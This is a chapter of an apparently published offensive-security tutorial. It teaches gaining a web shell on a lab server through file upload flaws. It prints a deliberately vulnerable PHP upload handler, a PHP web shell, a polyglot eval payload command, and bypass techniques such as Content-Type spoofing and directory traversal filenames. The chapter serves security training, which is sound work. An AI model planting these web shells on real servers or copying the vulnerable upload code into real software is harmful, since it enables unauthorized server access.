<html><head></head><body>
<section epub:type="chapter" role="doc-chapter" aria-labelledby="ch6">&#13;
<hgroup>&#13;
<h1 class="CHAPTER" id="ch6">&#13;
<span class="CN"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_117" aria-label="117"/><span class="SANS_Futura_Std_Bold_Condensed_B_11">6</span></span>&#13;
<span class="CT"><span class="SANS_Dogma_OT_Bold_B_11">GAINING A WEB SHELL</span></span>&#13;
</h1>&#13;
</hgroup>&#13;
<figure class="opener"><img class="opener" src="../images/opener.jpg" alt=""/></figure>&#13;
<p class="COS">Now that you understand the power of the bash shell, it should come as no surprise that hackers find popping a shell exhilarating. The phrase <i>popping a shell</i> describes the outcome of any attack whereby a hacker gains local or remote access to a system’s shell, then sends execution instructions to it.</p>&#13;
<p class="TX">There are numerous ways to gain shell access to a remote system, each targeting different entry points. For example, you could gain a remote shell via a web application vulnerability, by brute-forcing system accounts on a server, or by exploiting a vulnerability in a network service, such as FTP or Server Message Block.</p>&#13;
<p class="TX">These remote shells may differ from the bash shell you’re running on Kali, as they often come with limited interfaces and functionality, and without elevated privileges. Nonetheless, obtaining access to another computer’s shell is often the first step in performing some of the most catastrophic cyberattacks.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_118" aria-label="118"/>In this chapter, we’ll explore this popular approach to gaining initial access by using a <i>web shell</i>: a malicious script that provides an interface for unauthorized access to a web server. To achieve this, we’ll exploit <i>file upload vulnerabilities</i> that allow you to upload web shells to vulnerable websites.</p>&#13;
<p class="TX">We’ll also gain initial access using <i>OS command injection</i>: a vulnerability that allows for remote code execution through the injection of operating system commands into a web application’s form fields. By the end of this chapter, you’ll have gained initial access to two lab servers and developed custom bash scripts to interact with the underlying system.</p>&#13;
<section epub:type="division" aria-labelledby="sec1">&#13;
<h2 class="H1" id="sec1"><span id="h1-41"/><span class="SANS_Futura_Std_Bold_B_11">Arbitrary File Upload Vulnerabilities</span></h2>&#13;
<p class="TNI1">An <i>arbitrary file upload vulnerability</i> is a fairly common security flaw in web applications. It allows users to upload file types that shouldn’t be accepted and is caused by improper configurations or poor file validation and restriction controls.</p>&#13;
<p class="TX">As an example, the following vulnerable HTML accepts a user’s file via an HTTP POST request and moves the uploaded file to a specified target directory without validating the file’s type, size, or name. As a result, an attacker could upload any file, including a script, an executable, or other malicious content, to the server’s <i>uploads</i> directory.</p>&#13;
<pre><code>&lt;html&gt;&#13;
&lt;head&gt;&#13;
    &lt;title&gt;File Upload Form&lt;/title&gt;&#13;
&lt;/head&gt;&#13;
&lt;body&gt;&#13;
    &lt;form action="" method="POST" enctype="multipart/form-data"&gt;&#13;
        &lt;h2&gt;Upload File&lt;/h2&gt;&#13;
        &lt;input type="file" name="uploaded_file"&gt;&#13;
        &lt;input type="submit" name="submit" value="Upload"&gt;&#13;
    &lt;/form&gt;&#13;
&lt;/body&gt;&#13;
&lt;/html&gt;&#13;
&#13;
&lt;?php&#13;
if($_SERVER["REQUEST_METHOD"] == "POST"){&#13;
    $filename = $_FILES["uploaded_file"]["name"];&#13;
    move_uploaded_file($_FILES["uploaded_file"]["tmp_name"], "uploads/" . $filename);&#13;
    echo "Your file was uploaded successfully.";&#13;
}&#13;
?&gt;&#13;
</code></pre>&#13;
<p class="TX">To exploit this code, an attacker might upload a file containing a PHP: Hypertext Preprocessor (PHP) web shell payload, typically with a.<i>php</i> extension. The web shell code would provide the attacker with a command execution interface on the target system. Here is a simplified example of such a web shell payload:</p>&#13;
<pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_119" aria-label="119"/>&lt;?php&#13;
$output = shell_exec($_GET['cmd']) ;&#13;
echo $output;&#13;
?&gt;&#13;
</code></pre>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">shell_exec()</span> function allows a web application to execute shell commands from within a PHP script. It provides a way to interact with the server or operating system’s command line environment. When <span class="SANS_TheSansMonoCd_W5Regular_11">shell_exec()</span> is called with a command as its parameter, it executes that command in the system shell and returns the output as a string with the same user as the application’s context (commonly <i>www-data</i>, <i>apache</i>, or <i>nginx</i>). The payload will execute commands sent to it via the <span class="SANS_TheSansMonoCd_W5Regular_11">cmd</span> parameter in an HTTP GET request.</p>&#13;
<p class="TX">If the PHP web shell’s filename were <i>webshell.php</i>, the attacker could access it in a web browser by visiting the following URL: <i>http://target-site.com/uploads/webshell.php</i>. The PHP code in the web shell might then execute on the server, providing the attacker with an interface to execute commands on the system. Using the <span class="SANS_TheSansMonoCd_W5Regular_11">cmd</span> URL query parameter, the attacker could, for example, list files on the server with <span class="SANS_TheSansMonoCd_W5Regular_11">ls</span>: <i>http://target-site.com/uploads/webshell.php?cmd=ls</i>. If visited by a browser, this URL might execute the command on the target system and display the response in the browser.</p>&#13;
<p class="TX">Kali has a list of built-in web shells for numerous languages in the <i>/usr/ share/webshells</i> directory. Alternatively, you can find web shells at <i><a href="https://github.com/nicholasaleks/webshells.git">https://github.com/nicholasaleks/webshells.git</a></i>.</p>&#13;
<section epub:type="division" aria-labelledby="sec2">&#13;
<h3 class="H2" id="sec2"><span id="h2-84"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Fuzzing for Arbitrary File Uploads</span></h3>&#13;
<p class="TNI1">Developing and executing a web shell isn’t always as easy as the PHP example we just explored. Often you’ll need to bypass common controls used to protect against arbitrary file uploads. Let’s turn to the lab environment to explore tools for identifying these vulnerabilities.</p>&#13;
<p class="TX">One way to identify upload vulnerabilities is to use automated web application scanning tools. In <span class="Xref"><a href="chapter5.xhtml">Chapter 5</a></span>, we used dirsearch to find endpoints and functions that allow file uploads. Our scan revealed that the <i>p-web-01</i> machine (172.16.10.10) has a file upload page at <i>http://172.16.10.10:8081/upload</i>. <a href="chapter6.xhtml#fig6-1">Figure 6-1</a> shows what your Kali Firefox browser should return when you navigate to this URL.</p>&#13;
<figure class="IMG"><img id="fig6-1" class="img1" src="../images/pg119.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 6-1: A file uploader on the</span> <span class="SANS_Futura_Std_Book_11">p-web-01</span> <span class="SANS_Futura_Std_Book_Oblique_I_11">machine</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_120" aria-label="120"/>As you can see, the web page tells us it accepts only files with the <i>.jpg</i>, <i>.jpeg</i>, <i>.gif</i>, and <i>.png</i> extensions. Using manual testing, we can verify whether the application actually enforces this requirement.</p>&#13;
<p class="TX">To upload the correct web shell payload to the target, however, we must perform reconnaissance. There is no such thing as a silver-bullet payload that works for every language, web application, framework, and platform.</p>&#13;
<p class="TX">In previous chapters, scans against <i>p-web-01</i> told us that the web application uses Python and is running Flask, a web framework written in Python. Let’s try uploading a web shell that targets Python. First, download the <i>python-webshell-check.py</i> test file.</p>&#13;
<blockquote>&#13;
<p class="Note"><span class="SANS_Dogma_OT_Bold_B_15">NOTE</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>You can find this chapter’s files at</i> <span class="note_LinkURL"><a href="https://github.com/dolevf/Black-Hat-Bash/blob/master/ch06">https://github.com/dolevf/Black-Hat-Bash/blob/master/ch06</a></span>.</p>&#13;
<p class="TX">Now take a look at the file’s contents to better understand how it should work when we upload it:</p>&#13;
<pre><code>import subprocess&#13;
result = subprocess.check_output('id', shell=True)&#13;
print(result.decode('utf-8'))&#13;
</code></pre>&#13;
<p class="TX">This Python script uses the imported <span class="SANS_TheSansMonoCd_W5Regular_11">subprocess</span> module to execute a bash command on the underlying operating system. We hardcode the <span class="SANS_TheSansMonoCd_W5Regular_11">id</span> bash command in the <span class="SANS_TheSansMonoCd_W5Regular_11">subprocess.check_output()</span> function, which executes the specified command in a subprocess and captures its output. The <span class="SANS_TheSansMonoCd_W5Regular_11">shell=True</span> parameter allows the command to be executed through the shell, enabling the use of shell-specific functions and syntax. Finally, we print the results of the command to the console after decoding from a byte type to a string. When executed, this code should retrieve the user and group information for the user running the web application.</p>&#13;
<p class="TX">Unfortunately, as you can see in <a href="chapter6.xhtml#fig6-2">Figure 6-2</a>, we can’t upload the Python file to the web application. To check this yourself, click <b>Choose File</b>, browse to the saved web shell, then click <b>Upload</b>.</p>&#13;
<figure class="IMG"><img id="fig6-2" class="img7" src="../images/pg120.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 6-2: A file-type upload error</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_121" aria-label="121"/>In the next section, you’ll learn about several file upload bypass techniques you can use to evade restrictions and hopefully execute code.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec3">&#13;
<h3 class="H2" id="sec3"><span id="h2-85"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Bypassing File Upload Controls</span></h3>&#13;
<p class="TNI1">To protect against arbitrary file uploads, developers frequently use validating functions. These functions can verify a file’s size, extension, and other properties. However, hackers can leverage several common techniques to bypass many of these file upload controls. Let’s consider some of these techniques.</p>&#13;
<section epub:type="division" aria-labelledby="sec4">&#13;
<h4 class="H3" id="sec4"><span class="SANS_Futura_Std_Bold_Condensed_B_11">accept Attribute Modification</span></h4>&#13;
<p class="TNI1">Developers use the <span class="SANS_TheSansMonoCd_W5Regular_11">accept</span> HTML attribute in file input elements to specify the types of files that the browser should allow users to select for upload. By default, this attribute restricts files based on their extensions or Multipurpose Internet Mail Extensions (MIME) types. For example, the following line of HTML uses the <span class="SANS_TheSansMonoCd_W5Regular_11">accept</span> attribute to allow only specific file extensions:</p>&#13;
<pre><code>&lt;input type="file" name="file" <b>accept=".jpeg, .jpg, .gif, .png"</b>&gt;</code></pre>&#13;
<p class="TX">But because this attribute is set on the client side, attackers can easily bypass the control to trick the application into accepting files with different extensions or MIME types. We can manipulate the <span class="SANS_TheSansMonoCd_W5Regular_11">accept</span> attribute by using browser developer tools.</p>&#13;
<p class="TX">By default, the ACME Hyper Branding web application doesn’t use <span class="SANS_TheSansMonoCd_W5Regular_11">accept</span> attributes for the file upload input. To get a better understanding of how this control works, try modifying the client-side HTML to include the attribute, as shown in <a href="chapter6.xhtml#fig6-3">Figure 6-3</a>.</p>&#13;
<figure class="IMG"><img id="fig6-3" class="img1" src="../images/pg121.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 6-3: Using developer tools to modify the accept attribute</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_122" aria-label="122"/>If you attempt to upload files once more, you should notice that the Kali file explorer won’t display unsupported file types. However, you can easily append another file extension, like <i>.py</i>, to the <span class="SANS_TheSansMonoCd_W5Regular_11">accept</span> attribute or tell it to accept all file extensions by using the wildcard (<span class="SANS_TheSansMonoCd_W5Regular_11">*</span>) value. The web shell payload should then show up in the file explorer.</p>&#13;
<p class="TX">This technique alone may not succeed in bypassing file upload controls, especially if the web application implements server-side validation and proper file-type checking. Let’s consider some server-side control bypasses.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec5">&#13;
<h4 class="H3" id="sec5"><span class="SANS_Futura_Std_Bold_Condensed_B_11">File Extension Modification</span></h4>&#13;
<p class="TNI1">We can attempt to upload a malicious web shell payload by changing its file extension to one that the application allows. For instance, renaming a malicious script from <i>webshell.php</i> to <i>webshell.jpg</i> may bypass file-extension checks that allow only image files to be uploaded.</p>&#13;
<p class="TX">We can attempt to change the file extension for <i>python-webshell-check.py</i> to something like <i>python-webshell-check.jpg</i> and test the <i>p-web-01</i> web application’s upload functionality. Copy and rename the file by using this bash command:</p>&#13;
<pre><code>$ <b>cp python-webshell-check.py python-webshell-check.jpg</b></code></pre>&#13;
<p class="TX">When we attempt to upload the malicious script, the file should successfully upload, as shown in <a href="chapter6.xhtml#fig6-4">Figure 6-4</a>.</p>&#13;
<figure class="IMG"><img id="fig6-4" class="img7" src="../images/pg122-1.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 6-4: Successfully uploading the malicious script by changing its file extension</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">Can we now execute the script on the server? In <span class="Xref"><a href="chapter5.xhtml">Chapter 5</a></span>, we discovered the web application’s <i>/uploads</i> directory. Let’s visit this directory in the browser by navigating to <i><a href="http://172.16.10.10:8081/uploads">http://172.16.10.10:8081/uploads</a></i>. You should receive the error message in <a href="chapter6.xhtml#fig6-5">Figure 6-5</a>.</p>&#13;
<figure class="IMG"><img id="fig6-5" class="img7" src="../images/pg122-2.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 6-5: The ACME Hyper Branding</span> <span class="SANS_Futura_Std_Book_11">/uploads</span> <span class="SANS_Futura_Std_Book_Oblique_I_11">directory error message</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_123" aria-label="123"/>It looks like we’ll need to add a filename to the URL as a parameter. Try appending <i>python-webshell-check.jpg</i> to the end of this <i>/uploads</i> URL endpoint and then visit it.</p>&#13;
<p class="TX">The browser request should succeed, and the file should automatically download. We can verify whether the integrity of the malicious script was kept intact by the server by checking the contents of the downloaded file. Run the following bash command:</p>&#13;
<pre><code>$ <b>cat ~/Downloads/python-webshell-check.jpg</b>&#13;
&#13;
import subprocess&#13;
&#13;
# Basic python webshell checker&#13;
result = subprocess.check_output('id', shell=True)&#13;
&#13;
print(result.decode('utf-8'))&#13;
</code></pre>&#13;
<p class="TX">However, the web application doesn’t execute the Python file or run the <span class="SANS_TheSansMonoCd_W5Regular_11">id</span> shell command. Instead, it ignores the file contents and serves the file as a download when we visit its full URL path.</p>&#13;
<p class="TX">To execute malicious code, we’ll most likely need to rely on additional vulnerabilities in the application or server-side code that mishandle file uploads, perform insufficient validation, or incorrectly interpret the file’s content. By exploiting these vulnerabilities, we may be able to trick the server into executing the uploaded file as a script or executable.</p>&#13;
<p class="TX">Another variation on this technique is using <i>double extensions</i>, whereby an attacker appends a second extension to a file to bypass file-type checks. For example, we could try renaming <i>webshell.php</i> to <i>webshell.php.jpg</i>. This trick might be able to bypass a control that checks only the last part of the file extension or relies solely on the file extension to determine the file type.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec6">&#13;
<h4 class="H3" id="sec6"><span class="SANS_Futura_Std_Bold_Condensed_B_11">Malicious Polyglot Files</span></h4>&#13;
<p class="TNI1"><i>Polyglot files</i> are a fascinating kind of file that different applications interpret in different ways. This versatility stems from their exploitation of the specific structure and parsing rules of various file formats.</p>&#13;
<p class="TX">One way to create polyglot files is by manipulating the <i>file headers</i>, also known as <i>file signatures</i> or <i>magic bytes</i>, found at the beginning of the file. Operating systems and applications often use file headers to understand a file’s type so they can correctly interpret its data.</p>&#13;
<p class="TX">Malicious polyglot files could potentially circumvent security measures that validate a file’s extension or content type. By skillfully creating the file headers, we can deceive systems into treating files as benign when in reality they contain harmful content.</p>&#13;
<p class="TX">As an example, let’s consider the header for a JPEG image file. Ordinarily, JPEG files start with the standard magic byte signature of <span class="SANS_TheSansMonoCd_W5Regular_11">FF D8 FF E0</span>, followed by additional bytes:</p>&#13;
<pre><code><b>FF D8 FF E0</b> 00 10 4A 46 49 46 00 01</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_124" aria-label="124"/>We could try disguising the PHP web shell code as an innocent image file by cleverly appending the JPEG magic bytes to it, as demonstrated here:</p>&#13;
<pre><code>$ <b>echo -e "\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x00\x01&lt;?php</b>&#13;
<b>eval($_GET['cmd'];?&gt;" &gt; polyglot.php</b>&#13;
</code></pre>&#13;
<p class="TX">This bash command creates a malicious <i>polyglot.php</i> file with initial bytes suggesting that it is a JPEG file. After those bytes, however, we introduce PHP code. The injection will execute an <span class="SANS_TheSansMonoCd_W5Regular_11">eval()</span> function using the <span class="SANS_TheSansMonoCd_W5Regular_11">cmd</span> query parameter. You can use the <span class="SANS_TheSansMonoCd_W5Regular_11">file</span> <span class="SANS_TheSansMonoCd_W5Regular_11">polyglot.php</span> command to confirm the file’s type is a JPEG image data file.</p>&#13;
<p class="TX">Many tools and libraries can help us manipulate image file headers. Examples include hex editors like HxD, Hex Fiend, and Bless and libraries like libjpeg and libpng. The powerful ImageMagick and ExifTool command line tools can also manipulate a wide range of image file formats.</p>&#13;
<p class="TX">Certain conditions must exist for the malicious polyglot to work. First, when a user uploads the file, the server must interpret it as an image and save it successfully. Second, when the user requests the file, the PHP interpreter generating the response must recognize the file as a script and process it. In some cases, the file might need a.<i>php</i> extension to trigger PHP processing.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec7">&#13;
<h4 class="H3" id="sec7"><span class="SANS_Futura_Std_Bold_Condensed_B_11">Other Bypass Techniques</span></h4>&#13;
<p class="TNI1">In this section, we’ll briefly mention a few additional bypass techniques you could attempt.</p>&#13;
<p class="TX"><i>Null byte poisoning</i>, also known as <i>null byte injection</i> or <i>null character injection</i>, is used to manipulate file-handling systems that rely on null-terminated strings. This technique takes advantage of the presence of the null byte <span class="SANS_TheSansMonoCd_W5Regular_11">\x00</span>, which marks the end of a string in various programming languages.</p>&#13;
<p class="TX">This attack injects the null byte into the filename string, causing it to be truncated and potentially leading to unintended behavior. For instance, an attacker could rename <i>webshell.php</i> to <i>webshell.jpg%00.php</i>, injecting the URL-encoded representation of the null byte into the filename right after the <i>.jpg</i> extension. When processing the filename, a server may interpret it as <i>webshell.jpg</i>, unaware of the presence of the null byte and the subsequent.<i>php</i> extension. However, when the server later processes the file, it could read the file as a PHP script and execute the web shell.</p>&#13;
<p class="TX"><i>Content-Type header manipulation</i>, also known as <i>MIME type spoofing</i>, is a file upload control bypass technique that leverages the manipulation of the <span class="SANS_TheSansMonoCd_W5Regular_11">Content-Type</span> header in the HTTP request sent during the file upload. By changing the header to an allowed content type, we can potentially bypass the server-side file checks. The attacker would capture their outbound upload request by using an HTTP intercepting proxy like Burp Suite to manipulate the <span class="SANS_TheSansMonoCd_W5Regular_11">Content-Type</span> header before the request reaches the server.</p>&#13;
<p class="TX">Now that we’ve covered a few techniques, we can explore them in the lab environment to try uploading and executing a web shell.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec8">&#13;
<h3 class="H2" id="sec8"><span id="h2-86"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_125" aria-label="125"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Uploading Files with Burp Suite</span></h3>&#13;
<p class="TNI1">Let’s exploit the arbitrary file upload vulnerability on the <i>p-web-01</i> server by using Burp Suite to manipulate the <span class="SANS_TheSansMonoCd_W5Regular_11">Content-Type</span> HTTP header. Burp Suite is a popular security testing tool developed by PortSwigger that allows us to easily manipulate traffic being sent to web applications and view the responses they return.</p>&#13;
<p class="TX">Burp Suite comes preinstalled in Kali. Start it by clicking the top-left corner of the Kali machine’s menu bar and searching for <b>burp suite</b>. This should open the Burp Suite graphical user interface (GUI) in a separate window. If this is your first time launching the application, it should prompt you to choose your license type and the type of project file you want to run. Create a temporary project with the default settings.</p>&#13;
<p class="TX">Next, open the Burp Suite browser by navigating to the <b>Proxy</b> tab. Burp Suite allows you to temporarily halt all traffic between your client and remote web application by using its <i>proxy intercept</i> feature. We don’t need to enable this option currently, so ensure that its toggle button is set to <b>Intercept Is Off</b>, as shown in <a href="chapter6.xhtml#fig6-6">Figure 6-6</a>.</p>&#13;
<figure class="IMG"><img id="fig6-6" class="img1" src="../images/pg125.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 6-6: The Burp Suite Proxy page</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">Next, click <b>Open Browser</b>. This should launch Burp Suite’s internal, Chromium-based browser and proxy its traffic to the currently running Burp Suite instance. We’ll use this browser to launch initial attacks against the web application. Navigate to the <i>p-web-01</i> web application by visiting its URL, <i>http://172.16.10.10:8081</i>.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_126" aria-label="126"/>Now visit the <i>/upload</i> URL endpoint by using the Burp Suite browser. If you navigate to Burp Suite’s <b>Target</b> tab, you should see a directory structure similar to the one shown in <a href="chapter6.xhtml#fig6-7">Figure 6-7</a>. Click the upload link in the left navigation pane to see both the HTTP GET request and the response details.</p>&#13;
<figure class="IMG"><img id="fig6-7" class="img1" src="../images/pg126.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 6-7: The Burp Suite Target tab</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">Try uploading your original <i>python-webshell-check.py</i> file by using the Burp Suite browser and inspect the resulting traffic. You should get the <span class="SANS_TheSansMonoCd_W5Regular_11">File type is not allowed!</span> error message. In Burp Suite, this should look as shown in <a href="chapter6.xhtml#fig6-8">Figure 6-8</a>.</p>&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_127" aria-label="127"/>&#13;
<figure class="IMG"><img id="fig6-8" class="img1" src="../images/pg127.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 6-8: Captured request and response traffic in Burp Suite</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">In the request pane on the left, we can clearly see the HTTP POST request made to the <i>/upload</i> endpoint. It includes information about the host, origin, and header, but we’ll focus on the body of the request, which contains the filename, content type, and the file content itself:</p>&#13;
<pre><code>------WebKitFormBoundary&#13;
Content-Disposition: form-data; name="file"; <b>filename="python-webshell-check.py"</b>&#13;
<b>Content-Type: text/x-python</b>&#13;
&#13;
import subprocess&#13;
&#13;
# Basic python webshell checker&#13;
result = subprocess.check_output('id', shell=True)&#13;
&#13;
print(result.decode('utf-8'))&#13;
&#13;
------WebKitFormBoundary&#13;
</code></pre>&#13;
<p class="TX">We want to change the <span class="SANS_TheSansMonoCd_W5Regular_11">Content-Type</span> header value, so let’s forward this request to the Burp Suite <i>Repeater</i>, a tool used to manipulate HTTP requests and responses. Repeater allows us to tamper with any part of the HTTP request before we resend it to the web application. To send the request to Repeater, simply right-click the request pane and select <b>Send to Repeater</b>.</p>&#13;
<p class="TX">Now navigate to the <b>Repeater</b> tab in Burp Suite and modify the line <span class="SANS_TheSansMonoCd_W5Regular_11">Content-Type: text/x-python</span> to <span class="SANS_TheSansMonoCd_W5Regular_11">Content-Type:</span> <span class="SANS_TheSansMonoCd_W7Bold_B_11">image/jpeg</span>. This small change will <span role="doc-pagebreak" epub:type="pagebreak" id="pg_128" aria-label="128"/>hopefully trick the web application into thinking we’re uploading a <i>.jpeg</i> file, when really, we’re uploading a Python file. Note that we’re not modifying the <i>.py</i> extension of the filename.</p>&#13;
<p class="TX">Click the <b>Send</b> button located at the top left of the GUI and analyze the response. The <span class="SANS_TheSansMonoCd_W5Regular_11">File upload was successful!</span> message in the HTML content indicates that the <span class="SANS_TheSansMonoCd_W5Regular_11">Content-Type</span> manipulation succeeded at bypassing the file format control.</p>&#13;
<p class="TX">Is the web shell now accessible in the web application’s <i>/uploads</i> directory? Try browsing to the URL <i>http://172.16.10.10:8081/uploads/python-webshell-check.py</i>. As you can see in <a href="chapter6.xhtml#fig6-9">Figure 6-9</a>, the web page displays the contents of the Python file in a single line, instead of automatically serving it as a download as before.</p>&#13;
<figure class="IMG"><img id="fig6-9" class="img1" src="../images/pg128.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 6-9: The raw Python web shell uploaded to the web application</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">While we’ve made progress, our payload isn’t executing as expected on the web application. We wanted the <i>python-webshell-check.py</i> script to run the <span class="SANS_TheSansMonoCd_W5Regular_11">id</span> bash command and return the output to us in an HTTP response. In the next section, we’ll discuss the importance of properly staging a web shell by considering its execution context, file location, access controls, and the type of web framework being targeted.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec9">&#13;
<h2 class="H1" id="sec9"><span id="h1-42"/><span class="SANS_Futura_Std_Bold_B_11">Staging Web Shells</span></h2>&#13;
<p class="TNI1">Successfully popping a shell may involve technical considerations beyond simply exploiting a file upload vulnerability. Here are factors you should consider when staging a web shell:</p>&#13;
<p class="RunInPara1"><b>Execution context </b>Consider the target’s programming language, server configuration, and execution environment. For example, if the application runs on a PHP server, ensure that the web shell code is compatible with PHP syntax and features.</p>&#13;
<p class="RunInPara"><b>Filepath and location </b>Determine an appropriate filepath and location for the web shell by considering the target application’s directory structure, access controls, and file-inclusion mechanisms. Identify writable directories and locations at which the web shell can be stored and executed effectively. For example, you might be able to upload non-image filepaths such as <i>/uploads</i>, <i>/files</i>, or <i>/static</i> and images to <i>/images</i> or <i>/imgs</i>. There is no single standard, and files can live anywhere the developer desires. Identifying the web application’s root directory also helps. For example, websites are commonly stored at <i>/var/www/html</i> on a web server.</p>&#13;
<p class="RunInPara"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_129" aria-label="129"/><b>Access controls and authorization </b>Consider any access controls, authentication mechanisms, or user roles implemented in the application. Exploiting vulnerabilities related to user roles, privilege escalation, or authentication can provide additional opportunities for successful web shell staging. For example, you may be required to authenticate in order to upload a file even if the file is then accessible to unauthenticated users.</p>&#13;
<p class="RunInPara2"><b>Web application firewalls </b>Security systems such as web application firewalls could detect attempts to upload commonly used web shells. They could also identify attempts to execute system commands via HTTP parameters. Thus, using popular web shells like <i>c99.php</i> or <i>b374k</i> may increase your chances of getting caught and blocked. Other security systems, such as endpoint detection and response, may observe system process activity; if they detect a web server process attempting to run shell commands, they may raise alarms or block the execution altogether.</p>&#13;
<p class="TX">Let’s apply these principles to stage an effective web shell payload and completely compromise the <i>p-web-01</i> web application so we can execute whatever bash command we want on it.</p>&#13;
<section epub:type="division" aria-labelledby="sec10">&#13;
<h3 class="H2" id="sec10"><span id="h2-87"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Finding Directory Traversal Vulnerabilities</span></h3>&#13;
<p class="TNI1">Although we spoofed the <span class="SANS_TheSansMonoCd_W5Regular_11">Content-Type</span> header of the web shell to successfully bypass a server’s upload controls, we weren’t able to execute the malicious Python code because we didn’t properly stage the web shell on the Flask server.</p>&#13;
<p class="TX">Applications built with the Flask framework may contain a file called <i>app.py</i> or another similar name that indicates an application’s entry point. This file is responsible for initializing and configuring the application; it creates an instance of the Flask application and defines its various routes, views, and configurations. Manipulating this file would be a great way to execute a web shell on a Flask application.</p>&#13;
<p class="TX">We can try to overwrite the <i>app.py</i> file of the <i>p-web-01</i> web application by uploading a tampered version of it that includes a malicious web shell route. However, to accomplish this task, we’ll first need to figure out if we can upload a file outside the <i>/uploads</i> directory, which isn’t the parent directory of the application, where <i>app.py</i> should live.</p>&#13;
<p class="TX"><i>Directory traversal</i> vulnerabilities allow attackers to access files or directories outside the intended directory. This weakness can occur when input parameters or file upload functionality aren’t properly validated and sanitized. To exploit a directory traversal vulnerability, an attacker can craft a malicious filename that includes the directory traversal sequence <span class="SANS_TheSansMonoCd_W5Regular_11">../</span>.</p>&#13;
<p class="TX">For example, an attacker could upload a file with the filename <i>../../../../../etc/password</i>, allowing them to potentially modify critical system information. A single dot (<span class="SANS_TheSansMonoCd_W5Regular_11">.</span>) represents the current directory, and two dots (<span class="SANS_TheSansMonoCd_W5Regular_11">..</span>) represent the parent directory. By using multiple dot-dot-slash patterns (<span class="SANS_TheSansMonoCd_W5Regular_11">../</span>), we’re essentially navigating upward in the filesystem.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_130" aria-label="130"/>If we can manipulate the filename in our input, we could potentially traverse the filesystem, then upload the malicious <i>app.py</i> file to the app’s sensitive system directory. Let’s see if we can upload a file to another directory in <i>p-web-01</i>. Burp Suite’s Target tab shows us that the server has a <i>/static</i> directory used to host permanent assets like the <i>hero.png</i> image, as shown in <a href="chapter6.xhtml#fig6-10">Figure 6-10</a>. Targeting this static directory would be a good way to detect whether the server is vulnerable to directory traversal upload attacks.</p>&#13;
<figure class="IMG"><img id="fig6-10" class="img7" src="../images/pg130.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 6-10: The</span> <span class="SANS_Futura_Std_Book_11">/static</span> <span class="SANS_Futura_Std_Book_Oblique_I_11">directory on</span> <span class="SANS_Futura_Std_Book_11">p-web-01</span> <span class="SANS_Futura_Std_Book_Oblique_I_11">shown in the Burp Suite Target tab</span></p></figcaption>&#13;
</figure>&#13;
<blockquote>&#13;
<p class="Note"><span class="SANS_Dogma_OT_Bold_B_15">NOTE</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>If you can’t see images under the</i> <span class="note_Italic">/static</span> <i>directory, click the</i> <b><i>Filter</i></b> <i>bar below the Site Map tab, then click</i> <b><i>Show All</i></b>.</p>&#13;
<p class="TX">In Burp Suite Repeater, we’ll include a relative path to the <i>/static</i> directory in the filename of the <i>python-webshell-check.py</i> file. Rename it to <i>../static/python-webshell-check.py</i>, then send the request to the server. According to the response, the file should have been successfully uploaded. Browse to the <i>/static/python-webshell-check.py</i> URL to verify this.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec11">&#13;
